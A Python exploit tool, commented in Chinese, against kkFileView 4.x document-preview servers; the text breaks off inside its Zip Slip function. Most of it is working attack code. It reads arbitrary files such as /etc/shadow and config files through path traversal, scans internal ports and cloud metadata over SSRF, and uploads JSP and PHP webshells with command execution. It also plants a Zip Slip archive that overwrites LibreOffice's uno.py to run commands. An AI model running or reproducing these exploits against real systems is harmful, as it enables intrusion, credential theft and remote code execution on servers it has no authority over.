#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
kkFileView 综合漏洞检测/利用脚本 v2.0
覆盖 kkFileView 4.x 已知漏洞: 任意文件读取 / SSRF / 文件上传 RCE / Zip Slip RCE
仅用于授权安全测试 / 靶场验证

攻击模式:
  check  — 综合漏洞检测 (默认)
  read   — 任意文件读取利用
  ssrf   — SSRF 内网探测/端口扫描
  upload — 文件上传利用 (webshell 等)
  rce    — Zip Slip 命令执行利用
  shell  — 交互式利用 Shell

CVE 覆盖:
  CVE-2021-43734   — getCorsFile 路径穿越任意文件读取 (≤ 4.0.0)
  CVE-2022-43140   — getCorsFile SSRF (≤ 4.1.0)
  CVE-2022-42149   — OnlinePreviewController SSRF (≤ 4.1.0)
  CVE-2023-48815   — 不当访问控制 / Open Redirect
  CVE-2025-4538    — /fileUpload 未授权文件上传 (4.4.0) [CRITICAL 9.8]
  QVD-2024-14703   — Zip Slip 文件上传 RCE (4.2.0~4.4.0-beta) [CRITICAL 9.8]
"""

import requests
import sys
import argparse
import re
import random
import string
import time
import os
import zipfile
import tempfile
import urllib.parse
import socket
from typing import Optional, Tuple, List, Dict

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ===================== 工具函数 =====================

class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║     kkFileView 综合漏洞检测/利用工具 v2.0                        ║
║     检测 + 利用 | 7 项 CVE 覆盖 | 仅限授权安全使用              ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}/{path.lstrip('/')}"


def flag_match(resp: requests.Response, flag: str) -> Tuple[bool, str]:
    if flag in resp.text:
        idx = resp.text.find(flag)
        snippet = resp.text[max(0, idx - 15):idx + len(flag) + 100]
        return True, snippet.strip()
    return False, ""


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,*/*',
    })
    s.timeout = timeout
    return s


def strip_http(url: str) -> str:
    """从 URL 中提取 host:port 部分"""
    return url.split('://')[1].split('/')[0] if '://' in url else url.split('/')[0]


def parse_upload_response(resp_text: str) -> Tuple[Optional[str], List[str]]:
    """解析 /fileUpload 返回的 JSON，提取文件访问路径
    返回 (最可能的 URL 路径, 所有候选路径列表)
    kkFileView 不同版本返回格式不同:
      - {"code": 0, "data": "/demo/xxx.pdf"}
      - {"code": 200, "msg": "success", "data": {"fileName": "xxx", "fileUrl": "..."}}
      - {"code": 0, "msg": "success", "data": ["/demo/xxx.pdf"]}
    """
    import json
    candidates = []

    try:
        data = json.loads(resp_text)
    except Exception:
        return None, []

    def _dig(obj):
        """递归查找可能的文件路径/URL"""
        if isinstance(obj, str):
            s = obj.strip()
            if s and not s.startswith('{') and not s.startswith('<'):
                # 可能是文件路径或 URL
                if '/' in s or '\\' in s:
                    candidates.append(s)
        elif isinstance(obj, list):
            for item in obj:
                _dig(item)
        elif isinstance(obj, dict):
            for k, v in obj.items():
                k_lower = k.lower()
                # 优先从这些 key 中提取
                if any(kw in k_lower for kw in ['url', 'path', 'file', 'src', 'data', 'preview']):
                    if isinstance(v, str) and v.strip():
                        candidates.insert(0, v.strip())
                    else:
                        _dig(v)
                else:
                    _dig(v)

    _dig(data)

    # 去重
    unique = list(dict.fromkeys(candidates))
    return (unique[0] if unique else None), unique


def probe_file_access(url: str, s: requests.Session, filename: str, marker: str) -> Optional[str]:
    """探测上传文件的实际访问 URL
    尝试多种可能的路径组合，返回第一个可访问的 URL
    """
    # 从服务器响应中提取的路径
    base_paths = [
        f'/demo/{filename}',
        f'/file/{filename}',
        f'/{filename}',
        f'/upload/{filename}',
        f'/preview/{filename}',
        f'/files/{filename}',
        f'/demofile/{filename}',
        f'/static/{filename}',
    ]

    for bp in base_paths:
        try:
            r = s.get(build_url(url, bp), timeout=6)
            if r.status_code == 200:
                # 非 HTML 错误页面, 且包含标记或看起来是文件内容
                is_error_page = '<html' in r.text.lower()[:50] and ('error' in r.text.lower() or '404' in r.text)
                if not is_error_page:
                    if marker and marker in r.text:
                        return bp
                    if not marker and len(r.text) > 3:
                        return bp
        except Exception:
            continue

    return None


# ===================== 漏洞检测函数 =====================

def detect_version(url: str, s: requests.Session) -> Tuple[bool, Optional[str], Dict]:
    safe_print(f"\n{C.YLW}[0] 指纹检测{C.RST}")
    info: Dict[str, str] = {}
    detected = False

    fingerprints = [
        ('/', ['kkFileView', 'kkfileview', '文件预览', '在线预览'], '主页特征'),
        ('/index', ['kkFileView', 'filePreview'], 'index 端点'),
        ('/fileUpload', ['kkFileView', 'kkfileview', 'upload'], 'fileUpload 端点'),
        ('/js/base64.min.js', ['base64'], '静态资源 base64.js'),
        ('/getCorsFile?urlPath=invalid', [], 'getCorsFile 端点'),
        ('/onlinePreview?url=invalid', [], 'onlinePreview 端点'),
    ]

    for path, keywords, desc in fingerprints:
        try:
            r = s.get(build_url(url, path), timeout=8, allow_redirects=False)
            text_lower = r.text.lower()

            if 'getCorsFile' in desc:
                if r.status_code != 404:
                    safe_print(f"  {C.GRN}[+] {desc} 存在 (HTTP {r.status_code}){C.RST}")
                    detected = True
                    continue
            if 'onlinePreview' in desc:
                if r.status_code != 404 and 'error' in text_lower:
                    safe_print(f"  {C.GRN}[+] {desc} 存在 (HTTP {r.status_code}){C.RST}")
                    detected = True
                    continue
            for kw in keywords:
                if kw.lower() in text_lower:
                    safe_print(f"  {C.GRN}[+] 确认 kkFileView — {desc} (特征: {kw}){C.RST}")
                    detected = True
                    break
        except Exception:
            continue

    version = None
    try:
        r = s.get(build_url(url, '/'), timeout=8)
        for m in [
            re.search(r'kkFileView\s*v?(\d+\.\d+(?:\.\d+)?(?:-beta)?)', r.text, re.IGNORECASE),
            re.search(r'version["\s:=]+["\s]*(\d+\.\d+(?:\.\d+)?)', r.text, re.IGNORECASE),
        ]:
            if m:
                version = m.group(1)
                safe_print(f"  {C.GRN}[+] 版本: {version}{C.RST}")
                break
    except Exception:
        pass

    if not detected:
        safe_print(f"  {C.CYN}[-] 未识别到 kkFileView 指纹 (将继续检测){C.RST}")
    return detected, version, info


def check_cve_2021_43734(url: str, s: requests.Session) -> Tuple[List[str], str]:
    """返回 (hits, os_type) — os_type: 'linux' / 'windows' / '' """
    safe_print(f"\n{C.YLW}[1] CVE-2021-43734: getCorsFile 路径穿越任意文件读取{C.RST}")
    hits = []
    os_type = ''

    linux_files = [
        ('/etc/passwd', 'root:', 'Linux /etc/passwd'),
        ('/etc/hosts', 'localhost', 'Linux /etc/hosts'),
        ('/etc/shadow', 'root:', 'Linux /etc/shadow'),
        ('../../../../../../etc/passwd', 'root:', 'Linux /etc/passwd (遍历)'),
    ]
    windows_files = [
        ('C:/Windows/win.ini', '[fonts]', 'Windows win.ini'),
        ('C:/Windows/System32/drivers/etc/hosts', 'localhost', 'Windows hosts'),
    ]

    for filepath, expected, desc in linux_files:
        try:
            r = s.get(build_url(url, f"/getCorsFile?urlPath=file:///{filepath}"), timeout=10)
            if expected and expected in r.text:
                safe_print(f"  {C.RED}[!] 任意文件读取 — {desc}!{C.RST}")
                safe_print(f"  {C.RED}    回显: {r.text[:200].strip()}{C.RST}")
                hits.append(f"CVE-2021-43734 任意文件读取 ({desc})")
                os_type = 'linux'
                break
        except Exception:
            continue

    if not hits:
        for filepath, expected, desc in windows_files:
            try:
                r = s.get(build_url(url, f"/getCorsFile?urlPath=file:///{filepath}"), timeout=10)
                if expected in r.text:
                    safe_print(f"  {C.RED}[!] 任意文件读取 — {desc}!{C.RST}")
                    safe_print(f"  {C.RED}    回显: {r.text[:200].strip()}{C.RST}")
                    hits.append(f"CVE-2021-43734 任意文件读取 ({desc})")
                    os_type = 'windows'
                    break
            except Exception:
                continue

    # URL 编码绕过
    if not hits:
        for ep, expected, desc in [
            ("/getCorsFile?urlPath=file%3A%2F%2F%2Fetc%2Fpasswd", 'root:', 'URL 编码绕过'),
            ("/getCorsFile?urlPath=file://127.0.0.1/etc/passwd", 'root:', 'file://127.0.0.1 绕过'),
        ]:
            try:
                r = s.get(build_url(url, ep), timeout=10)
                if expected in r.text:
                    safe_print(f"  {C.RED}[!] 任意文件读取 (绕过) — {desc}!{C.RST}")
                    hits.append(f"CVE-2021-43734 ({desc})")
                    os_type = 'linux'
                    break
            except Exception:
                continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 CVE-2021-43734 (可能已修复){C.RST}")
    return hits, os_type


def check_ssrf(url: str, s: requests.Session, callback: str = None) -> List[str]:
    safe_print(f"\n{C.YLW}[2] CVE-2022-43140 / CVE-2022-42149: SSRF 检测{C.RST}")
    hits = []

    ssrf_tests = [
        ("/getCorsFile?urlPath=http://127.0.0.1:80/", 'getCorsFile http://127.0.0.1'),
        ("/getCorsFile?urlPath=http://169.254.169.254/latest/meta-data/", 'getCorsFile AWS 元数据'),
        ("/onlinePreview?url=http://127.0.0.1:8080/", 'onlinePreview http://127.0.0.1'),
        ("/onlinePreview?url=dict://127.0.0.1:6379/info", 'onlinePreview dict://redis'),
        ("/onlinePreview?url=gopher://127.0.0.1:6379/_INFO", 'onlinePreview gopher://redis'),
        ("/onlinePreview?url=http%3A%2F%2F169.254.169.254%2F", 'onlinePreview AWS 元数据'),
        ("/picturesPreview?urls=http%3A%2F%2F127.0.0.1:80%2F", 'picturesPreview SSRF'),
    ]

    for path, desc in ssrf_tests:
        try:
            r = s.get(build_url(url, path), timeout=12, allow_redirects=False)
            if 'ami-id' in r.text or 'instance-id' in r.text:
                safe_print(f"  {C.RED}[!] 云元数据 SSRF — {desc}!{C.RST}")
                hits.append(f"SSRF 云元数据泄露 ({desc})")
            elif 'redis_version' in r.text or '-ERR' in r.text:
                safe_print(f"  {C.RED}[!] Redis SSRF — {desc}!{C.RST}")
                hits.append(f"SSRF Redis ({desc})")
            elif r.status_code != 404 and len(r.text) > 20:
                ct = r.headers.get('Content-Type', '')
                if 'json' in ct.lower() or 'text' in ct.lower():
                    safe_print(f"  {C.YLW}[*] 疑似 SSRF — {desc} (HTTP {r.status_code}, {len(r.text)}B){C.RST}")
        except requests.exceptions.Timeout:
            if '127.0.0.1' in path or '169.254' in path:
                safe_print(f"  {C.YLW}[*] 请求超时 — {desc} (可能连接到内网){C.RST}")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 SSRF (可用 --callback 指定回显地址){C.RST}")
    return hits


def check_zip_slip_rce(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[3] QVD-2024-14703: Zip Slip 文件上传 RCE (4.2.0~4.4.0-beta){C.RST}")
    hits = []
    rk = randstr(8)
    flag = f"ZIPSLIP_{rk}"

    tmpdir = tempfile.mkdtemp(prefix='kkfv_')
    zip_path = os.path.join(tmpdir, f'test_{rk}.zip')
    try:
        marker_file = os.path.join(tmpdir, f'{rk}.txt')
        with open(marker_file, 'w') as f:
            f.write(flag)

        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.write(marker_file, f'{rk}.txt')
            zf.writestr(
                f'../../../../../../../../../../../../../../../tmp/kkfv_test_{rk}.py',
                f'# kkFileView test marker: {flag}\n'
            )

        upload_url = build_url(url, '/fileUpload')
        with open(zip_path, 'rb') as f:
            r = s.post(upload_url, files={'file': (f'test_{rk}.zip', f, 'application/zip')}, timeout=15)

        if r.status_code == 200:
            try:
                result = r.json()
                if result.get('code') in (0, 200) or result.get('success'):
                    safe_print(f"  {C.GRN}[+] ZIP 上传成功, 验证路径穿越...{C.RST}")
                    for vp in [
                        f'/getCorsFile?urlPath=file:///tmp/kkfv_test_{rk}.py',
                        f'/getCorsFile?urlPath=file:///../../../../../../tmp/kkfv_test_{rk}.py',
                    ]:
                        try:
                            vr = s.get(build_url(url, vp), timeout=8)
                            if flag in vr.text:
                                safe_print(f"  {C.RED}[!] Zip Slip 路径穿越确认!{C.RST}")
                                safe_print(f"  {C.RED}    (可覆盖 LibreOffice uno.py 实现 RCE){C.RST}")
                                hits.append("QVD-2024-14703 Zip Slip RCE")
                                break
                        except Exception:
                            continue
            except Exception:
                pass
        elif r.status_code not in (404,):
            safe_print(f"  {C.GRN}[+] /fileUpload 端点存在 (HTTP {r.status_code}){C.RST}")
    except Exception as e:
        safe_print(f"  {C.CYN}[-] Zip Slip 检测异常: {e}{C.RST}")
    finally:
        try:
            os.unlink(zip_path)
            os.unlink(marker_file)
            os.rmdir(tmpdir)
        except Exception:
            pass

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 Zip Slip RCE{C.RST}")
    return hits


def check_cve_2025_4538(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[4] CVE-2025-4538: /fileUpload 未授权文件上传 (CVSS 9.8){C.RST}")
    hits = []
    rk = randstr(8)
    marker = f"MARKER_{rk}"

    test_files = [
        (f'test_{rk}.html', f'<html><body>{marker}</body></html>', 'text/html', 'HTML'),
        (f'test_{rk}.svg', f'<svg xmlns="http://www.w3.org/2000/svg"><text x="10" y="20">{marker}</text></svg>', 'image/svg+xml', 'SVG (XSS)'),
        (f'test_{rk}.txt', f'{marker}', 'text/plain', 'TXT'),
        (f'test_{rk}.jsp', f'<% out.println("{marker}"); %>', 'text/plain', 'JSP webshell'),
        (f'test_{rk}.php', f'<?php echo "{marker}"; ?>', 'text/plain', 'PHP webshell'),
    ]

    upload_url = build_url(url, '/fileUpload')
    for filename, content, mime, desc in test_files:
        try:
            r = s.post(upload_url, files={'file': (filename, content.encode(), mime)}, timeout=15)
            if r.status_code == 200:
                try:
                    result = r.json()
                    code = result.get('code', '')
                    if code in (0, 200) or str(code) == '0' or result.get('success'):
                        safe_print(f"  {C.RED}[!] 文件上传成功 — {desc}!{C.RST}")

                        # 解析服务器返回的文件路径
                        parsed_path, candidates = parse_upload_response(r.text)
                        if parsed_path:
                            safe_print(f"  {C.BLU}    服务器返回路径: {parsed_path}{C.RST}")

                        # 探测实际可访问的 URL
                        access_path = probe_file_access(url, s, filename, marker)
                        if access_path:
                            full_url = build_url(url, access_path)
                            safe_print(f"  {C.RED}    [可访问] {full_url}{C.RST}")
                        else:
                            # 尝试服务器返回的路径
                            if parsed_path:
                                for try_path in candidates:
                                    try:
                                        # 如果是完整 URL, 直接访问
                                        if try_path.startswith('http'):
                                            vr = s.get(try_path, timeout=6)
                                        else:
                                            vr = s.get(build_url(url, try_path), timeout=6)
                                        if vr.status_code == 200 and marker in vr.text:
                                            safe_print(f"  {C.RED}    [可访问] {try_path}{C.RST}")
                                            break
                                    except Exception:
                                        continue
                            if not access_path:
                                safe_print(f"  {C.YLW}    [提示] 可能需通过预览接口间接访问: {url}/onlinePreview?url={urllib.parse.quote(parsed_path or '')}{C.RST}")

                        hits.append(f"CVE-2025-4538 未授权文件上传 ({desc})")
                        break  # 已确认漏洞，不继续测其他类型
                except Exception:
                    if any(kw in r.text.lower() for kw in ['success', 'upload', 'ok']):
                        safe_print(f"  {C.RED}[!] 文件上传疑似成功 — {desc}!{C.RST}")
                        hits.append(f"CVE-2025-4538 未授权文件上传 ({desc})")
                        break
            elif r.status_code == 404:
                break
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未确认 CVE-2025-4538{C.RST}")
    return hits


def check_info_disclosure(url: str, s: requests.Session) -> List[str]:
    safe_print(f"\n{C.YLW}[5] 信息泄露 / 配置探测{C.RST}")
    hits = []

    config_paths = [
        '/getCorsFile?urlPath=file:///opt/kkFileView/config/application.properties',
        '/getCorsFile?urlPath=file:///app/config/application.properties',
        '/getCorsFile?urlPath=file:///home/kkFileView/config/application.properties',
    ]
    for cf in config_paths:
        try:
            r = s.get(build_url(url, cf), timeout=8)
            for ci in ['spring.', 'server.port', 'file.dir', 'password', 'datasource']:
                if ci in r.text:
                    safe_print(f"  {C.RED}[!] 配置文件泄露!{C.RST}")
                    safe_print(f"  {C.RED}    {r.text[:300].strip()}{C.RST}")
                    hits.append("配置文件泄露 (application.properties)")
                    return hits
        except Exception:
            continue

    for ae in ['/actuator', '/actuator/env', '/actuator/mappings', '/actuator/heapdump', '/manage/health']:
        try:
            r = s.get(build_url(url, ae), timeout=8)
            if r.status_code == 200 and len(r.text) > 10:
                if any(kw in r.text.lower() for kw in ['spring', 'java.version', 'diskSpace', 'status']):
                    safe_print(f"  {C.RED}[!] Actuator 暴露 — {ae}!{C.RST}")
                    hits.append(f"Actuator 信息泄露 ({ae})")
        except Exception:
            continue

    for se in ['/swagger-ui.html', '/v2/api-docs', '/v3/api-docs', '/doc.html']:
        try:
            r = s.get(build_url(url, se), timeout=8)
            if r.status_code == 200 and len(r.text) > 50:
                if any(kw in r.text.lower() for kw in ['swagger', 'openapi', 'paths']):
                    safe_print(f"  {C.RED}[!] API 文档暴露 — {se}!{C.RST}")
                    hits.append(f"API 文档暴露 ({se})")
        except Exception:
            continue

    if not hits:
        safe_print(f"  {C.CYN}[-] 未发现额外信息泄露{C.RST}")
    return hits


def run_all_checks(url: str, s: requests.Session, args) -> List[str]:
    """执行全部漏洞检测，返回所有命中"""
    is_kkfv, version, info = detect_version(url, s)
    all_hits: List[str] = []

    file_hits, os_type = check_cve_2021_43734(url, s)
    all_hits.extend(file_hits)

    all_hits.extend(check_ssrf(url, s, getattr(args, 'callback', None)))

    if not getattr(args, 'no_upload', False):
        all_hits.extend(check_zip_slip_rce(url, s))
        all_hits.extend(check_cve_2025_4538(url, s))

    all_hits.extend(check_info_disclosure(url, s))

    # 汇总
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"{C.BLD}检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'=' * 60}{C.RST}")
    safe_print(f"  目标 : {url}")
    if version:
        safe_print(f"  版本 : kkFileView {version}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个漏洞:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any(c in str(unique_hits) for c in ['2025-4538', 'Zip Slip', '2021-43734']):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 存在严重漏洞 (CVSS >= 7.5)，建议立即修复!{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞{C.RST}")
    safe_print(f"{C.BLU}{'=' * 60}{C.RST}\n")

    return unique_hits


# ===================== 利用函数 =====================

def exploit_read_file(url: str, s: requests.Session, filepath: str, output: str = None):
    """利用 CVE-2021-43734 读取服务器任意文件"""
    safe_print(f"\n{C.BLD}读取文件: {filepath}{C.RST}\n")

    payloads = [
        f"/getCorsFile?urlPath=file:///{filepath}",
        f"/getCorsFile?urlPath=file:///../../../../../../{filepath.lstrip('/')}",
        f"/getCorsFile?urlPath=file%3A%2F%2F%2F{urllib.parse.quote(filepath)}",
        f"/onlinePreview?url=file:///{filepath}",
    ]

    for pl in payloads:
        try:
            r = s.get(build_url(url, pl), timeout=15)
            if r.status_code == 200 and len(r.text) > 3:
                content = r.text
                safe_print(content[:5000])
                if len(content) > 5000:
                    safe_print(f"\n{C.CYN}... (截断, 共 {len(content)} 字节){C.RST}")

                if output:
                    with open(output, 'w', encoding='utf-8') as f:
                        f.write(content)
                    safe_print(f"\n{C.GRN}[+] 已保存到: {output}{C.RST}")
                return content
        except Exception as e:
            continue

    safe_print(f"{C.RED}[-] 文件读取失败 (所有 payload 均失败){C.RST}")
    return None


def exploit_ssrf_port_scan(url: str, s: requests.Session, target: str, ports: str = None):
    """利用 SSRF 进行内网端口扫描"""
    safe_print(f"\n{C.BLD}SSRF 内网端口扫描{C.RST}")
    safe_print(f"{C.BLD}目标: {target}{C.RST}\n")

    default_ports = [21, 22, 80, 443, 3306, 6379, 8080, 8443, 9090, 9200, 11211, 27017]
    if ports:
        try:
            scan_ports = []
            for part in ports.split(','):
                if '-' in part:
                    start, end = map(int, part.split('-'))
                    scan_ports.extend(range(start, end + 1))
                else:
                    scan_ports.append(int(part))
        except Exception:
            safe_print(f"{C.RED}[-] 端口格式错误，使用默认端口{C.RST}")
            scan_ports = default_ports
    else:
        scan_ports = default_ports

    endpoints = [
        ('/onlinePreview', 'url'),
        ('/getCorsFile', 'urlPath'),
    ]

    open_ports = []
    for port in scan_ports:
        for ep, param in endpoints:
            try:
                test_url = f"http://{target}:{port}/"
                encoded = urllib.parse.quote(test_url)
                r = s.get(build_url(url, f"{ep}?{param}={encoded}"), timeout=5, allow_redirects=False)

                if r.status_code != 502 and r.status_code != 504:
                    ct = r.headers.get('Content-Type', '')
                    size = len(r.text)
                    banner = r.text[:80].replace('\n', ' ').replace('\r', '')
                    open_ports.append((port, r.status_code, size, banner))
                    safe_print(f"  {C.GRN}[+] {port}/tcp OPEN — HTTP {r.status_code}, {size}B [{banner}]...{C.RST}")
                    break
            except requests.exceptions.Timeout:
                # 超时可能意味着端口是开的但协议不同
                pass
            except Exception:
                continue

    if not open_ports:
        safe_print(f"  {C.CYN}未发现开放端口 (目标可能不可达或被防火墙阻断){C.RST}")

    return open_ports


def exploit_upload_file(url: str, s: requests.Session, local_file: str, remote_name: str = None):
    """利用 CVE-2025-4538 上传文件"""
    if not os.path.exists(local_file):
        safe_print(f"{C.RED}[-] 文件不存在: {local_file}{C.RST}")
        return None

    remote_name = remote_name or os.path.basename(local_file)
    safe_print(f"\n{C.BLD}上传文件: {local_file} → {remote_name}{C.RST}")

    upload_url = build_url(url, '/fileUpload')
    try:
        with open(local_file, 'rb') as f:
            r = s.post(upload_url, files={'file': (remote_name, f)}, timeout=30)

        safe_print(f"\nHTTP {r.status_code}")
        safe_print(f"响应: {r.text[:500]}")

        if r.status_code == 200:
            try:
                result = r.json()
                if result.get('code') in (0, 200):
                    safe_print(f"\n{C.GRN}[+] 上传成功!{C.RST}")
                    return result
            except Exception:
                pass
        return None
    except Exception as e:
        safe_print(f"{C.RED}[-] 上传失败: {e}{C.RST}")
        return None


def exploit_upload_webshell(url: str, s: requests.Session, shell_type: str = 'jsp'):
    """生成并上传 webshell"""
    safe_print(f"\n{C.BLD}上传 {shell_type.upper()} Webshell{C.RST}")

    pwd = randstr(6)
    marker = f"WS_{randstr(6)}"
    shells = {
        'jsp': (
            f'shell_{randstr(4)}.jsp',
            f'<% if("{pwd}".equals(request.getParameter("p"))){{out.println("{marker}");Runtime.getRuntime().exec(request.getParameter("c"));}} %>',
            'application/octet-stream'
        ),
        'php': (
            f'shell_{randstr(4)}.php',
            f'<?php echo "{marker}";@eval($_POST["{pwd}"]); ?>',
            'application/octet-stream'
        ),
        'html': (
            f'xss_{randstr(4)}.html',
            f'<html><body>{marker}<script>alert(document.cookie)</script></body></html>',
            'text/html'
        ),
    }

    if shell_type not in shells:
        safe_print(f"{C.RED}[-] 不支持的 shell 类型: {shell_type}{C.RST}")
        safe_print(f"    支持: {', '.join(shells.keys())}{C.RST}")
        return None

    filename, content, mime = shells[shell_type]
    safe_print(f"  Shell 文件: {filename}")
    safe_print(f"  密码/参数: {pwd}")

    upload_url = build_url(url, '/fileUpload')
    try:
        r = s.post(upload_url, files={'file': (filename, content.encode(), mime)}, timeout=15)

        if r.status_code == 200:
            safe_print(f"  响应: {r.text[:300]}")

            try:
                result = r.json()
                if result.get('code') in (0, 200) or result.get('success'):
                    safe_print(f"\n{C.GRN}[+] Webshell 上传成功!{C.RST}")

                    # 解析路径
                    parsed_path, candidates = parse_upload_response(r.text)
                    if parsed_path:
                        safe_print(f"{C.BLU}  服务器返回路径: {parsed_path}{C.RST}")

                    # 探测实际访问 URL
                    access_path = probe_file_access(url, s, filename, marker)

                    if access_path:
                        shell_url = build_url(url, access_path)
                        safe_print(f"\n{C.RED}{C.BLD}  [Shell URL] {shell_url}{C.RST}")
                        if shell_type == 'jsp':
                            safe_print(f"  [测试连通] {shell_url}?p={pwd}{C.RST}")
                            safe_print(f"  [执行命令] {shell_url}?p={pwd}&c=whoami{C.RST}")
                        elif shell_type == 'php':
                            safe_print(f"  [连接] POST {shell_url}  data: {pwd}=system('id');{C.RST}")
                    elif parsed_path:
                        shell_url = build_url(url, parsed_path) if not parsed_path.startswith('http') else parsed_path
                        safe_print(f"\n{C.YLW}{C.BLD}  [推断 Shell URL] {shell_url}{C.RST}")
                        if shell_type == 'jsp':
                            safe_print(f"  [测试] {shell_url}?p={pwd}{C.RST}")
                        elif shell_type == 'php':
                            safe_print(f"  [连接] POST {shell_url}  data: {pwd}=system('id');{C.RST}")
                    else:
                        safe_print(f"\n{C.YLW}  无法确定访问路径，尝试常见路径:{C.RST}")
                        for bp in [f'/demo/{filename}', f'/file/{filename}', f'/{filename}']:
                            try_url = build_url(url, bp)
                            safe_print(f"    探测: {try_url}")
                            try:
                                vr = s.get(try_url, timeout=6)
                                if vr.status_code == 200 and marker in vr.text:
                                    safe_print(f"  {C.GRN}    可访问!{C.RST}")
                                    if shell_type == 'jsp':
                                        safe_print(f"  [执行] {try_url}?p={pwd}&c=whoami{C.RST}")
                                    break
                            except Exception:
                                continue

                    return result
            except Exception:
                safe_print(f"  响应: {r.text[:300]}")

    except Exception as e:
        safe_print(f"{C.RED}[-] 上传失败: {e}{C.RST}")

    return None


def exploit_zip_slip_rce(url: str, s: requests.Session, command: str):
    """
    利用 QVD-2024-14703 Zip Slip 实现 RCE
    原理: 上传恶意 ZIP 覆盖 LibreOffice uno.py → 上传 ODT 触发预览 → 执行命令
    """
    safe_print(f"\n{C.BLD}Zip Slip RCE 利用{C.RST}")
    safe_print(f"{C.BLD}执行命令: {command}{C.RST}\n")

    rk = randstr(8)
    result_flag = f"RCE_RESULT_{rk}"

    # Step 1: 构造恶意 ZIP 覆盖 uno.py
    uno_payload = f'''import os,subprocess,sys
result = subprocess.run("{command}", shell=True, capture_output=True, text=True)
with open("/tmp/kkfv_rce_{rk}.txt", "w") as f:
    f.write(result.stdout + "\\n" + result.stderr)

# original uno functionality preserved for stealth
def _original_uno():
    pass
'''

    # 多个可能的 LibreOffice uno.py 路径
    uno_paths = [
        '../../../../../../../../../../../../../../../opt/libreoffice7.5/program/uno.py',
        '../../../../../../../../../../../../../../../opt/libreoffice7.6/program/uno.py',
        '../../../../../../../../../../../../../../../opt/libreoffice7.4/program/uno.py',
        '../../../../../../../../../../../../../../../opt/libreoffice7.3/program/uno.py',
        '../../../../../../../../../../../../../../../usr/lib/libreoffice/program/uno.py',
    ]

    tmpdir = tempfile.mkdtemp(prefix='kkfv_rce_')
    zip_path = os.path.join(tmpdir, f'doc_{rk}.zip')
    odt_path = os.path.join(tmpdir, f'doc_{rk}.odt')

    try:
        # 构造恶意 ZIP
        with zipfile.ZipFile(zip_path, 'w') as zf:
            zf.writestr(f'{rk}.txt', 'dummy')  # 正常文件 (必须有一个)
            for uno_path in uno_paths:
                zf.writestr(uno_path, uno_payload)

        # Step 2: 上传恶意 ZIP
        safe_print(f"  {C.CYN}[1/3] 上传恶意 ZIP...{C.RST}")
        r = s.post(build_url(url, '/fileUpload'),
                   files={'file': (f'doc_{rk}.zip', open(zip_path, 'rb'), 'application/zip')},
                   timeout=15)

        if r.status_code != 200:
            safe_print(f"  {C.RED}[-] 上传失败 (HTTP {r.status_code}){C.RST}")
            return None

        try:
            resp = r.json()
            if resp.get('code') not in (0, 200):
                safe_print(f"  {C.RED}[-] 上传失败: {resp}{C.RST}")
                return None
        except Exception:
            pass

        safe_print(f"  {C.GRN}[+] ZIP 上传成功{C.RST}")

        # Step 3: 上传 ODT 文件触发预览 (调用 LibreOffice → 执行 uno.py)
        safe_print(f"  {C.CYN}[2/3] 上传 ODT 触发预览...{C.RST}")
        # 创建一个最小 ODT (实际是 ZIP 格式)
        with zipfile.ZipFile(odt_path, 'w') as zf:
            zf.writestr('mimetype', 'application/vnd.oasis.opendocument.text')
            zf.writestr('content.xml',
                        '<?xml version="1.0" encoding="UTF-8"?>'
                        '<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">'
                        f'<office:body><text:p>{rk}</text:p></office:body>'
                        '</office:document>')

        r2 = s.post(build_url(url, '/fileUpload'),
                    files={'file': (f'doc_{rk}.odt', open(odt_path, 'rb'),
                                    'application/vnd.oasis.opendocument.text')},
                    timeout=15)

        if r2.status_code == 200:
            safe_print(f"  {C.GRN}[+] ODT 已上传, 等待 LibreOffice 处理...{C.RST}")
        else:
            safe_print(f"  {C.YLW}[*] ODT 上传 HTTP {r2.status_code}, 等待处理...{C.RST}")

        # Step 4: 尝试获取命令结果
        safe_print(f"  {C.CYN}[3/3] 获取命令结果...{C.RST}")
        time.sleep(3)

        result_paths = [
            f'/getCorsFile?urlPath=file:///tmp/kkfv_rce_{rk}.txt',
            f'/getCorsFile?urlPath=file:///../../../../../../tmp/kkfv_rce_{rk}.txt',
            f'/onlinePreview?url=file:///tmp/kkfv_rce_{rk}.txt',
        ]

        for rp in result_paths:
            try:
                rr = s.get(build_url(url, rp), timeout=10)
                if rr.status_code == 200 and len(rr.text) > 3:
                    output = rr.text.strip()
                    safe_print(f"\n{C.GRN}{'=' * 50}{C.RST}")
